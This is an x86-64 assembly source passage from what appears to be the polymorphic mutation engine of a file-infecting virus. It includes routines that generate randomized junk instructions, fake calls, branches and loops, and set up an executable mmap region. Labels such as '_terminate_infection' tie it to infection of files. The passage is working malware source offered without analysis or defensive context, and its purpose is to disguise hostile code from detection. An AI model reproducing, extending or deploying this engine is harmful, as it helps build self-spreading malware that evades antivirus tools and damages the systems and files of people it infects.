ADD_FUNCTION
mmap_di:	POLY_DEBUG_STRING *mmap_di
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	al,_DI		; NULL
		INT3_CALL alloc_regw
		mov	dl,al
		mov	dh,0x8
		xor	rbx,rbx
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		END_EBLOCK_OPCODE
		ret

ADD_FUNCTION
mmap_si:	POLY_DEBUG_STRING *mmap_si
		BEGIN_EBLOCK_OPCODE
		mov	al,_SI		; size
		INT3_CALL alloc_regw
		mov	dl,al
		mov	dh,8
		mov	ebx,[g_poly_mmap_size]
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

ADD_FUNCTION
mmap_dx:	POLY_DEBUG_STRING *mmap_dx
		BEGIN_EBLOCK_OPCODE
		mov	al,_DX		; PROT_READ|PROT_WRITE|PROT_EXEC
		INT3_CALL alloc_regw
		mov	dl,al
		mov	dh,8
		push	PROT_READ|PROT_WRITE|PROT_EXEC
		pop	rbx
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

ADD_FUNCTION
mmap_r10:	POLY_DEBUG_STRING *mmap_r10
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	al,_R10		; MAP_PRIVATE|MAP_ANONYMOUS
		INT3_CALL alloc_regr
		mov	dl,al
		mov	dh,0x88
		push	MAP_PRIVATE|MAP_ANONYMOUS
		pop	rbx
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		END_EBLOCK_OPCODE
		ret

ADD_FUNCTION
mmap_r8:	POLY_DEBUG_STRING *mmap_r8
		BEGIN_EBLOCK_OPCODE
		mov	al,_R8		; -1
		INT3_CALL alloc_regr
		mov	dl,al
		mov	dh,0x88
		push	-1
		pop	rbx
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

ADD_FUNCTION
mmap_r9:	POLY_DEBUG_STRING *mmap_r9
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		mov	al,_R9		; NULL
		INT3_CALL alloc_regr
		mov	dl,al
		mov	dh,0x88
		xor	rbx,rbx
		INT3_CALL load_reg_nc
		INT3_CALL small_junk
		END_EBLOCK_OPCODE
		ret

;-[mmap_check_error]----------------------------------------------------------
; emit mmap error check of dest reg, return fail condition code +0x80 in AH
ADD_FUNCTION
mmap_error_check:
		POLY_DEBUG_STRING +mmap_error_check
		BEGIN_EBLOCK_OPCODE
		mov	dh,0x88
		mov	dl,[g_dest_reg]
		mov	al,3
		INT3_CALL rand_al
		jnz	.test_reg_sf
		; cmp reg,-4095/4096
		mov	rbx,-4095
		mov	ah,0x80|_cNC		; error if not below -4095
		INT3_CALL rand_prob
		js	.s1
		dec	rbx
		mov	ah,0x80|_cA		; error if not below or equal to -4096
	.s1:	mov	ch,_CMP
		INT3_CALL emit_op_80
		jmp	.exit
	.test_reg_sf:
		dec	eax
		jnz	.bt_cf
		INT3_CALL gen_test_reg		; error if reg signed
		mov	ah,0x80|_cS
		INT3_CALL rand_prob
		js	.s2
		mov	ah,0x80|_cL
	.s2:	jmp	.exit
	.bt_cf:	; bt/btr high bit - error if cf
		mov	ch,_BT
		INT3_CALL rand_prob
		js	.s3
		mov	ch,_BTR
	.s3:	mov	bl,63
		INT3_CALL emit_op_0FBA
		mov	ah,0x80|_cC
	.exit:	END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -mmap_error_check
		ret

;-[set_rel32]-----------------------------------------------------------------
; set rel32 reloc: rbx = offset of rel32, rax = destination
ADD_FUNCTION
set_rel32:	POLY_DEBUG_STRING +set_rel32
		BEGIN_EBLOCK_OPCODE
		push	rax
		sub	rax,rbx
		sub	eax,4
		mov	[rbx],eax
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -set_rel32
		ret

;-[set_rel8]----------------------------------------------------------------
; set rel8 reloc: rbx = offset of rel8, rax = destination
ADD_FUNCTION
set_rel8:	POLY_DEBUG_STRING +set_rel8
		BEGIN_EBLOCK_OPCODE
		push	rax
		sub	rax,rbx
		dec	eax
		cmp	eax,0x7F
		jbe	.do
		cmp	eax,-0x80
		jl	_terminate_infection
	.do:	mov	[rbx],al
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -set_rel8
		ret


;-[big_junk]------------------------------------------------------------------
; do big junk - loops, push/pop etc
ADD_FUNCTION
big_junk:	POLY_DEBUG_STRING +big_junk
		INT3_CALL zf_if_ofile
		jz	small_junk
		bt	dword [g_poly_flags],RETAL_POLY_EXE_BIG_JUNK
		jnc	small_junk
		BEGIN_EBLOCK_OPCODE
		multipush rax,rbx,rcx,rdx,rsi,rbp
		lea	rsi,[BIG_JUNK_CALL_TABLE]
		cmp	byte [g_poly_call_depth],3
		mov	al,BIG_JUNK_CALL_TABLE_COUNT
		jb	.r
		mov	al,BIG_JUNK_CALL_TABLE_NON_RECURSIVE_COUNT
	.r:	INT3_CALL call_table_rand
		multipop rax,rbx,rcx,rdx,rsi,rbp
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -big_junk
	.ret:	ret

BEGIN_CALL_TABLE BIG_JUNK_CALL_TABLE
	CALL_TABLE_ITEM small_junk
	CALL_TABLE_ITEM	big_junk_run
	CALL_TABLE_ITEM big_junk_syscall
 BIG_JUNK_CALL_TABLE_NON_RECURSIVE_COUNT	equ	($ - BIG_JUNK_CALL_TABLE)/2
	CALL_TABLE_ITEM big_junk_call
	CALL_TABLE_ITEM big_junk_if_else
	CALL_TABLE_ITEM big_junk_loop
END_CALL_TABLE

;-[BIG_JUNK_x2]---------------------------------------------------------------
ADD_FUNCTION
	big_junk_x2:
		INT3_CALL big_junk
		INT3_CALL rand_prob
		jpe	.ret
		INT3_CALL big_junk
	.ret:	ret

;-[small_junk]----------------------------------------------------------------
; do small junk - just a run of junk ops.
ADD_FUNCTION
small_junk:	POLY_DEBUG_STRING +small_junk
		call	 zf_if_ofile
		jnz	.enter
		bt	dword [g_poly_flags],RETAL_POLY_O_SMALL_JUNK
		jnc	.ret
	.enter:	BEGIN_EBLOCK	;_OPCODE
		multipush rax,rbx,rcx,rdx,rsi,rbp
		mov	bl,[g_junk_level]
		mov	al,bl
		call	rand_al
		cmp	bl,3
		jne	.no_bl1
		mov	bl,1
	.no_bl1:add	al,bl
		push	rax
		pop	rbp
		.l:	cmp	rdi,[g_max_junk_rdi]
			jae	.exit
			call	get_junk_parameters
			cmp	dl,-1
			je	.exit
			lea	rsi,[SMALL_JUNK_CALL_TABLE]
			mov	al,SMALL_JUNK_CALL_TABLE_COUNT
			call 	call_table_rand
			cmp	qword [g_max_junk_rdi],-1
			jne	.l
			test	ebp,ebp
			jnz	.l
	.exit:	multipop rax,rbx,rcx,rdx,rsi,rbp
		END_EBLOCK	;_OPCODE
	.ret:	POLY_DEBUG_STRING -small_junk
		ret

BEGIN_CALL_TABLE SMALL_JUNK_CALL_TABLE
	CALL_TABLE_ITEM junk_op_80
	CALL_TABLE_ITEM junk_op_C0
	CALL_TABLE_ITEM junk_op_B0
	CALL_TABLE_ITEM junk_op_F6_FE
	CALL_TABLE_ITEM junk_op_rr
	CALL_TABLE_ITEM junk_op_0FBA
	CALL_TABLE_ITEM junk_op_0FA3
	CALL_TABLE_ITEM junk_op_mul
	CALL_TABLE_ITEM junk_op_98
	CALL_TABLE_ITEM junk_op_69
	CALL_TABLE_ITEM junk_op_bsr
	CALL_TABLE_ITEM junk_op_90
	CALL_TABLE_ITEM junk_op_bswap
	CALL_TABLE_ITEM junk_op_8D
	CALL_TABLE_ITEM junk_op_0F90
	CALL_TABLE_ITEM junk_op_0FA4
	CALL_TABLE_ITEM junk_op_0F40
	CALL_TABLE_ITEM junk_op_0FAF
	CALL_TABLE_ITEM junk_op_0FB6
	CALL_TABLE_ITEM junk_op_86
	CALL_TABLE_ITEM junk_op_63
	CALL_TABLE_ITEM junk_op_0FC0
	CALL_TABLE_ITEM junk_op_0FB0
	CALL_TABLE_ITEM junk_push
	CALL_TABLE_ITEM junk_pop
	CALL_TABLE_ITEM junk_load_mem_reg
END_CALL_TABLE

;-[junk3]---------------------------------------------------------------------
; emit 1 - 3 junk instructions
ADD_FUNCTION
junk3:		POLY_DEBUG_STRING +junk3
		BEGIN_EBLOCK_OPCODE
		push	rax
		mov	al,3
		xchg	al,[g_junk_level]
		push	rax
		INT3_CALL small_junk
		pop	rax
		mov	[g_junk_level],al
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -junk3
		ret

;-[junk_127]------------------------------------------------------------------
; generate less than 127 bytes of junk
ADD_FUNCTION
junk_127:	POLY_DEBUG_STRING +junk_127
		BEGIN_EBLOCK_OPCODE
		push	rax
		lea	rax,[rdi+(127 - 15 - 2 - 3)]
		mov	[g_max_junk_rdi],rax
		INT3_CALL small_junk
		or	qword [g_max_junk_rdi],-1
		pop	rax
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -junk_127
		ret

;-[big_junk_call]-------------------------------------------------------------
ADD_FUNCTION
big_junk_call:	POLY_DEBUG_STRING +big_junk_call
		BEGIN_EBLOCK_OPCODE
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		inc	byte [g_poly_call_depth]
		mov	rbx,[g_poly_current_call]
		mov	rax,[g_byteregs]
		mov	[rbx+JUNK_CALL.used_regs],rax
		mov	al,0xE8
		stosb
		mov	[rbx+JUNK_CALL.rel32],rdi
		scasd
		add	qword [g_poly_current_call],JUNK_CALL_size
		dec	byte [g_poly_call_depth]
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -big_junk_call
		ret

;-[big_junk_if_else]----------------------------------------------------------
; big junk - if, [else]
ADD_FUNCTION
big_junk_if_else:
		POLY_DEBUG_STRING +big_junk_if_else
		BEGIN_EBLOCK_OPCODE
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		mov	eax,[g_poly_flags]
		push	rax
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		inc	byte [g_poly_call_depth]
		INT3_CALL junk_if_branch
		mov	al,0x0F
		stosb
		mov	al,bl
		or	al,0x80
		stosb
		push	rdi
		scasd
		INT3_CALL big_junk_x2
		xor	rsi,rsi
		INT3_CALL rand_prob
		js	.no_else
		mov	al,0xE9
		stosb
		push	rdi
		pop	rsi
		scasd
	.no_else:
		push	rdi
		pop	rax
		pop	rbx
		INT3_CALL set_rel32
		test	rsi,rsi
		jz	.no_else2
		INT3_CALL big_junk_x2
		push	rdi
		pop	rax
		push	rsi
		pop	rbx
		INT3_CALL set_rel32
	.no_else2:
	.exit:	pop	rax
		mov	[g_poly_flags],eax
		dec	byte [g_poly_call_depth]
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -big_junk_if_else
	.ret:	ret

;-[big_junk_loop]-------------------------------------------------------------
; big junk - loop
ADD_FUNCTION
big_junk_loop:	cmp	word [g_wordregs],-1
		je	small_junk
		CHECK_BREAKPOINT
		BEGIN_EBLOCK_OPCODE
		mov	eax,[g_poly_flags]
		push	rax
		bts	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		inc	byte [g_poly_call_depth]
		INT3_CALL small_junk
		mov	ch,1
		INT3_CALL get_AL_1248
		mov	dh,al
		INT3_CALL alloc_word_reg_DX
		push	rdx
		mov	al,10
		INT3_CALL rand_al
		push	4
		pop	rbx
		add	rbx,rax
		INT3_CALL choose_loop_type
		INT3_CALL rand_prob
		sets	r14b
		INT3_CALL load_loop_count
		push	rdi
		push	r14
		INT3_CALL big_junk_x2
		pop	r14
		mov	r15b,0
		INT3_CALL gen_loop_branch
		pop	rdx
		lea	rax,[rdx+126]
		cmp	rdi,rax
		ja	.F80
		mov	al,0x70
		or	al,r8b
		stosb
		push	rdi
		scasb
		pop	rbx
		push	rdx
		pop	rax
		INT3_CALL set_rel8
		jmp	.exit
	.F80:	mov	al,0x0F
		stosb
		mov	al,0x80
		or	al,r8b
		stosb
		push	rdi
		scasd
		pop	rbx
		push	rdx
		pop	rax
		INT3_CALL set_rel32
	.exit:	pop	rdx
		INT3_CALL free_word_reg_DX
		dec	byte [g_poly_call_depth]
		pop	rax
		mov	[g_poly_flags],eax
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
	.ret:	ret

;-[big_junk_run]--------------------------------------------------------------
; big junk - just a run of instructions.
ADD_FUNCTION
big_junk_run:	POLY_DEBUG_STRING +big_junk_run
		BEGIN_EBLOCK_OPCODE
		INT3_CALL small_junk
		INT3_CALL small_junk
		INT3_CALL small_junk
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		POLY_DEBUG_STRING -big_junk_run
		ret

;-[junk_op_80]----------------------------------------------------------------
; emit junk 0x80 op.
; regs setup by get_junk_parameters.
ADD_FUNCTION
junk_op_80:	POLY_DEBUG_STRING +junk_op_80
		BEGIN_EBLOCK
		call get_write_dx
	.no_cmp:call rand_any
		and	al,0x38
		cmp	al,_CMP
		je	.no_cmp
		mov	ch,al
		call emit_op_80
		dec	ebp
		END_EBLOCK
		POLY_DEBUG_STRING -junk_op_80
		ret

;-[junk_op_C0]----------------------------------------------------------------
; emit junk 0xC0/D0/D2 (shift/rot) op
; regs setup by get_junk_parameters.
ADD_FUNCTION
junk_op_C0:	POLY_DEBUG_STRING +junk_op_C0
		BEGIN_EBLOCK
		call get_write_dx
	.no_SAL:call rand_any
		and	al,0x38
		cmp	al,_SAL
		je	.no_SAL
		mov	ch,al
		call rand_prob
		jpo	.doC0
		mov	bl,1
		js	.doC0
		test	dh,dh
		js	.doC0
		cmp	dl,_CX
		je	.doC0
		or	ch,sh_cl
	.doC0:	clc
		call emit_op_C0
		dec	ebp
		END_EBLOCK
		POLY_DEBUG_STRING -junk_op_C0
		ret

;-[junk_op_B0]----------------------------------------------------------------
; emit junk 0xB0/oxB8
; regs setup by reg_get_junk_parameters
ADD_FUNCTION
junk_op_B0:	POLY_DEBUG_STRING +junk_op_B0
		BEGIN_EBLOCK
		call emit_op_B0
		dec	ebp
		END_EBLOCK
		POLY_DEBUG_STRING -junk_op_B0
		ret

;-[junk_op_rr]----------------------------------------------------------------
; emit junk r/r op.
; regs setup by get_junk_parameters.
ADD_FUNCTION
junk_op_rr:	POLY_DEBUG_STRING +junk_op_rr
		BEGIN_EBLOCK
		xor	esi,esi
		call get_write_dx
		call get_read_cl
	.no_cmp:call rand_any
		and	al,0x38
		cmp	al,_CMP
		jne	.no_mov
		mov	al,_MOV_rm
	.no_mov:mov	ch,al
		call emit_op_rr_nc
		dec	ebp
		END_EBLOCK
		POLY_DEBUG_STRING -junk_op_rr
		ret


;-[junk_op_F6_FE]-------------------------------------------------------------
; emit junk 0xF6/0xFE op
; regs setup by get_junk_parameters
ADD_FUNCTION
junk_op_F6_FE:	POLY_DEBUG_STRING +junk_op_F6_FE
		BEGIN_EBLOCK
		call get_write_dx
		call rand_any
		mov	ch,_DEC
		and	ch,al	; INC/DEC
		call rand_prob
		js	.F6
		call emit_op_FE
		jmp	.exit
	.F6:	add	ch,0x10	; NOT/NEG
		call emit_op_F6
	.exit:	dec	ebp
		END_EBLOCK
		POLY_DEBUG_STRING -junk_op_F6_FE
		ret

;-[junk_op_0FBA]--------------------------------------------------------------
; emit junk 0x0F 0xBA  op (BT imm8)
; regs setup by get_junk_parameters
ADD_FUNCTION
junk_op_0FBA:	POLY_DEBUG_STRING +junk_op_0FBA
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		call get_write_dx
	.l:	call rand_any
		and	al,0x38
		cmp	al,_BT
		jb	.l
		mov	ch,al
		call emit_op_0FBA
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FBA
		ret

;-[junk_op_0FA3]--------------------------------------------------------------
; emit junk 0x0F 0xA3  op (BT r,r)
; regs setup by get_junk_parameters
ADD_FUNCTION
junk_op_0FA3:	POLY_DEBUG_STRING +junk_op_0FA3
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		xor	esi,esi
		call get_write_dx
		test	dh,0x40
		jnz	.m
		cmp	dl,0xFF
		jne	.l
	.m:	call zf_if_CL_free
		jnz	.exit
		multipush rcx,rdx
		call swap_DX_CL
		call get_BH_BL_shift_mask
		mov	bl,bh
		movzx	rbx,bl
		mov	ch,_AND
		call emit_op_80
		multipop rcx,rdx
	.l:	call rand_any
		and	al,0x38
		cmp	al,_BT
		jb	.l
		mov	ch,0xA3
		or	ch,al
		call emit_op_rr_cf
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FA3
		ret

;-[junk_op_mul]---------------------------------------------------------------
; emit mul/imul reg
ADD_FUNCTION
junk_op_mul:	POLY_DEBUG_STRING +junk_op_mul
		BEGIN_EBLOCK
		call get_write_dx
		mov	al,[g_wordregs]
		test	al,bit(_AX)
		jnz	.exit
		test	dh,1
		jnz	.do_ch
		test	al,bit(_DX)
		jnz	.exit
	.do_ch:	call swap_DX_CL
		call get_read_dx
		mov	ch,_MUL
		call rand_prob
		js	.no_imul
		mov	ch,_IMUL
	.no_imul:
		call emit_op_F6
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_mul
		ret

;-[junk_op_98]----------------------------------------------------------------
; emit junk 98/99 cbw,cwde,cdqe,cwd,cdq,cqo
ADD_FUNCTION
junk_op_98:	POLY_DEBUG_STRING +junk_op_98
		BEGIN_EBLOCK
		mov	ah,0x98
		mov	al,[g_wordregs]
		test	al,bit(_AX)
		jnz	.try_dx
		call rand_prob
		js	.emit
	.try_dx:mov	ah,0x99
		test	al,bit(_DX)
		jnz	.exit
	.emit:	call rand_prob
		js	.no_prefix
		mov	al,0x48
		jpo	.do_prefix
		mov	al,0x66
	.do_prefix:
		stosb
	.no_prefix:
		mov	al,ah
		stosb
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_98
		ret

;-[junk_op_69]----------------------------------------------------------------
; emit junk 69/6B imul r,r,imm
ADD_FUNCTION
junk_op_69:	POLY_DEBUG_STRING +junk_op_69
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		call rand_prob
		jpe	.emit
		mov	cl,0x80		; use same reg
		and	cl,dh
		or	cl,dl
	.emit:	call swap_DX_CL
		call get_read_dx
		mov	ch,0x69
		movsx	rsi,bl
		cmp	rsi,rbx
		jne	.no_sign
		and	dh,0x80 + 0x40
		inc	dh
		mov	ch,0x6B
	.no_sign:
		xchg	dh,dl
		mov	sil,0xF
		and	sil,dl
		xchg	dh,dl
		call emit_op_rr_nc
		test	dh,8
		jz	.imm
		mov	dh,4
	.imm:	call emit_RBX_DH
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_69
		ret

;-[junk_op_bsr]---------------------------------------------------------------
; emit junk bsf/bsr r,r
ADD_FUNCTION
junk_op_bsr:	POLY_DEBUG_STRING +junk_op_bsr
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		call swap_DX_CL
		call get_read_dx
		xor	esi,esi
		call rand_prob
		setpo	ch
		add	ch,0xBC
		call emit_op_rr_cf
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_bsr
		ret

;-[junk_op_90]----------------------------------------------------------------
; emit junk 90 - xchg (r,e)ax,r16/32/64
ADD_FUNCTION
junk_op_90:	POLY_DEBUG_STRING +junk_op_90
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		test	byte [g_wordregs],bit(_AX)
		jnz	.exit
		test	dh,dh
		js	.emit
		test	dl,dl
		jz	.exit
	.emit:	call emit_DH_prefix
		mov	al,0x90
		or	al,dl
		stosb
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_90
		ret

;-[junk_op_bswap]-------------------------------------------------------------
; emit junk bswap r32/64
ADD_FUNCTION
junk_op_bswap:	POLY_DEBUG_STRING +junk_op_bswap
		BEGIN_EBLOCK
		test	dh,1+2
		jnz	.exit
		call emit_DH_prefix
		mov	al,0x0F
		stosb
		mov	al,0xC8
		or	al,dl
		stosb
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_bswap
		ret

;-[junk_op_8D]--------------------------------------------------------------
; emit junk lea r64,[r64]
ADD_FUNCTION
junk_op_8D:	POLY_DEBUG_STRING +junk_op_8D
		BEGIN_EBLOCK
		test	dh,8+4
		jz	.exit
		and	dh,0x80
		or	dh,8
		call get_read_cl
		or	cl,0x40
		mov	ch,_LEA_rm
		xor	esi,esi
		call emit_op_rr_nc
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_8D
		ret

;-[junk_op_0F90]--------------------------------------------------------------
; emit junk SETxx r8
ADD_FUNCTION
junk_op_0F90:	POLY_DEBUG_STRING +junk_op_0F90
		BEGIN_EBLOCK
		test	dh,1
		jz	.exit
		call get_write_dx
		call emit_DH_prefix
		mov	al,0x0F
		stosb
		mov	al,0x10
		call rand_al
		add	al,0x90
		xor	cx,cx
		call set_AH_modrm
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0F90
		ret

;-[junk_op_0FA4]--------------------------------------------------------------
; emit junk shld/shrd reg,reg/mem,imm8/cl
ADD_FUNCTION
junk_op_0FA4:	POLY_DEBUG_STRING +junk_op_0FA4
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		mov	ah,0x80
		and	ah,cl
		mov	al,0xF
		and	al,dh
		or	ah,al
		mov	al,7
		and	al,cl
		call get_write_cl
		cmp	cl,0x7E
		jne	.no_mem
		push	rax
		pop	rdx
	.no_mem:;call get_write_dx
		mov	sil,1
		call rand_any
		and	al,0x8
		or	al,0xA4
		call get_BH_BL_shift_mask
		and	bl,bh
		jz	.use_cl
		call rand_prob
		js	.no_cl
	.use_cl:inc	al
		dec	sil
	.no_cl:	mov	ch,al
		call emit_op_rr_cf
		test	al,1
		jnz	.done
		mov	al,bl
		stosb
	.done:	dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FA4
		ret

;-[junk_op_0F40]--------------------------------------------------------------
; emit junk CMOV r,r
ADD_FUNCTION
junk_op_0F40:	POLY_DEBUG_STRING +junk_op_0F40
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		call swap_DX_CL
		call get_read_dx
		xor	esi,esi
		mov	al,0x10
		call rand_al
		mov	ch,0x40
		add	ch,al
		call emit_op_rr_cf
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0F40
		ret

;-[junk_op_0FAF]--------------------------------------------------------------
; emit junk IMUL r,r
ADD_FUNCTION
junk_op_0FAF:	POLY_DEBUG_STRING +junk_op_0FAF
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		call swap_DX_CL
		call get_read_dx
		xor	esi,esi
		mov	ch,0xAF
		call emit_op_rr_cf
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FAF
		ret

;-[junk_op_0FB6]--------------------------------------------------------------
; emit junk MOVZX/MOVSX r,r
ADD_FUNCTION
junk_op_0FB6:	POLY_DEBUG_STRING +junk_op_0FB6
		BEGIN_EBLOCK
		test	dh,1
		jnz	.exit
		call rand_any
		and	al,0x8 + 1
		test	dh,2
		jz	.no_word
		and	al,~1
	.no_word:
		call swap_DX_CL
		call get_read_dx
		xor	esi,esi
		mov	ch,0xB6
		add	ch,al
		call emit_op_rr_cf
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FB6
		ret

;-[junk_op_86]----------------------------------------------------------------
; emit junk MOV/XCHG r,r
ADD_FUNCTION
junk_op_86:	POLY_DEBUG_STRING +junk_op_86
		BEGIN_EBLOCK
		xor	esi,esi
		call get_write_dx
		mov	ch,_XCHG_rm
		call zf_if_CL_free
		jnz	.mov
		call rand_prob
		js	.emit
	.mov:	mov	ch,_MOV_rm
	.emit:	call emit_op_rr_nc
		dec	ebp
		END_EBLOCK
		POLY_DEBUG_STRING -junk_op_86
		ret

;-[junk_op_63]----------------------------------------------------------------
; emit junk movsxd r64,r32
ADD_FUNCTION
junk_op_63:	POLY_DEBUG_STRING +junk_op_63
		BEGIN_EBLOCK
		test	dh,8
		jz	.exit
		call rand_prob
		js	.no4
		xor	dh,8^4
	.no4:	call swap_DX_CL
		xor	esi,esi
		call get_read_dx
		mov	ch,0x63
		call emit_op_rr_nc
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_63
		ret
;-[junk_op_0FC0]---------------------------------------------------------------
; emit junk XADD r,r
ADD_FUNCTION
junk_op_0FC0:	POLY_DEBUG_STRING +junk_op_0FC0
		BEGIN_EBLOCK
		call zf_if_CL_free
		jnz	.exit
		xor	esi,esi
		call get_write_dx
		mov	ch,0xC0
		call emit_op_rr_cf
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FC0
		ret

;-[junk_op_0FB0]---------------------------------------------------------------
; emit junk CMPXCHG ax,r,r
ADD_FUNCTION
junk_op_0FB0:	POLY_DEBUG_STRING +junk_op_0FB0
		BEGIN_EBLOCK
		mov	ax,[g_byteregs]
		test	dh,1
		jnz	.useb
		mov	al,ah

	.useb:	test	al,1
		jnz	.exit
		mov	ch,0xB0
		xor	esi,esi
		call get_write_dx
		call emit_op_rr_cf
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_op_0FB0
		ret

;-[junk_push]------------------------------------------------------------------
; push register\flags\immediate onto stack if available
ADD_FUNCTION
junk_push:	POLY_DEBUG_STRING +junk_push
		BEGIN_EBLOCK
		bt	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		jc	.exit
		bt	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		jnc	.exit
		test	dh,1
		jnz	.exit
		mov	al,[g_current_stack_count]
		cmp	al,[g_max_stack_count]
		jae	.exit
		call rand_prob
		js	.reg
		jpo	.f
		call emit_op_68
		jmp	.bp
	.f:	mov	al,0x9C
		stosb
		jmp	.bp
	.reg:	call swap_DX_CL
		call get_read_dx
		test	dh,40
		jnz	.m
		cmp	dl,0xFE
		jne	.r
	.m:	and	dh,0x80 + 0x40
		or	dh,4
		call emit_DH_prefix
		mov	ch,_PUSH
		call emit_op_FE
		jmp	.bp
	.r:	xor	ch,ch
		call emit_op_50
	.bp:	inc	byte [g_current_stack_count]
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_push
		ret


;-[junk_pop]------------------------------------------------------------------
; pop register off stack if available
ADD_FUNCTION
junk_pop:	POLY_DEBUG_STRING +junk_pop
		BEGIN_EBLOCK
		bt	dword [g_poly_flags],RETAL_POLY_IN_JUNK
		jc	.exit
		bt	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		jnc	.exit
		test	dh,1
		jnz	.exit
		cmp	byte [g_current_stack_count],0
		je	.exit
		dec	byte [g_current_stack_count]
		call get_write_dx
		test	dh,0x40
		jnz	.m
		cmp	dl,0xFF
		jne	.r
	.m:	mov	al,0x8E
		and	dh,0x80 + 0x40
		or	dh,4
		call emit_DH_prefix
		xor	ecx,ecx
		call set_AH_modrm
		jmp	.bp
	.r:	mov	ch,8
		call emit_op_50
	.bp:	dec	ebp
	.exit:	END_EBLOCK
	.ret:	POLY_DEBUG_STRING -junk_pop
		ret

;-[junk_clear_stack]----------------------------------------------------------
; clears junk items pushed on the stack.
ADD_FUNCTION
junk_clear_stack:
		POLY_DEBUG_STRING +junk_clear_stack
		BEGIN_EBLOCK
		movzx	rbx,byte [g_current_stack_count]
		test	ebx,ebx
		jz	.exit
		call rand_prob
		js	.use_pop
		mov	dh,0x8
		mov	dl,_SP
		mov	ch,_ADD
		jpe	.add
		mov	ch,_SUB
		neg	rbx
	.add:	shl	ebx,3
		call emit_op_80
		jmp	.clear
	.use_pop:
		bts	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
		pushf
		push	rbx
		pop	rbp
	.l:	call get_junk_parameters
		call junk_pop
		test	ebp,ebp
		jnz	.l
		popf
		jc	.clear
		btr	dword [g_poly_flags],RETAL_POLY_USE_STACK_JUNK
	.clear:	mov	byte [g_current_stack_count],0
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_clear_stack
		ret

;-[junk_load_mem_reg]---------------------------------------------------------
; load a 64-bit register as a memory pointer.
ADD_FUNCTION
junk_load_mem_reg:
		POLY_DEBUG_STRING +junk_load_mem_reg
		BEGIN_EBLOCK
		test	dword [g_poly_flags],bit(RETAL_POLY_IN_JUNK)|bit(RETAL_POLY_IN_CALL)
		jnz	.exit
		test	dh,1
		jnz	.exit
		and	dh,0x80
		or	dh,8
		push	rdx
		mov	dx,[g_poly_mem_reg_dx]
		cmp	dl,-1
		je	.no_free
		call free_word_reg_DX
		mov	word [g_poly_mem_reg_dx],-1
	.no_free:
		pop	rdx
		call get_read_cl
		cmp	cl,0x7F
		jne	.exit
		mov	al,dl
		test	dh,dh
		jns	.alloc_w
		call alloc_regr
		jmp	.lea
	.alloc_w:
		call alloc_regw
	.lea:	mov	[g_poly_mem_reg_dx],dx
		mov	ch,_LEA_rm
		xor	esi,esi
		call emit_op_rr_nc
		mov	al,[g_poly_last_mem_write]
		mov	[g_poly_mem_reg_write],al
		dec	ebp
	.exit:	END_EBLOCK
		POLY_DEBUG_STRING -junk_load_mem_reg
		ret

;-[get_junk_parameters]-------------------------------------------------------
; get junk parameters: dx = write reg, cl = read reg, rbx = imm
; dl=-1 if no regs available
